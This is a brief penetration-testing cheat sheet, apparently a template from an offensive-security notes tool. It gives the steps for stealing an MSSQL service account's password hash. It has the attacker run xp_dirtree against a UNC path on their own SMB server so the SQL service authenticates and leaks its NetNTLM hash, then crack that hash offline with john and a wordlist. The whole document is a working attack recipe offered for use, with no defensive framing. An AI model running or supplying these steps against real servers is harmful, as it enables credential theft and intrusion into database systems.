# MSSQL - Get Service Hash

```
1 - Connect with the impacket mssql client
2 - Start SMB server
3 - execute: exec xp_dirtree '\\${__LHOST}\F\file'
4 - copy the hash into a file
5 - execute: john hash -w=${__WORDS}
```
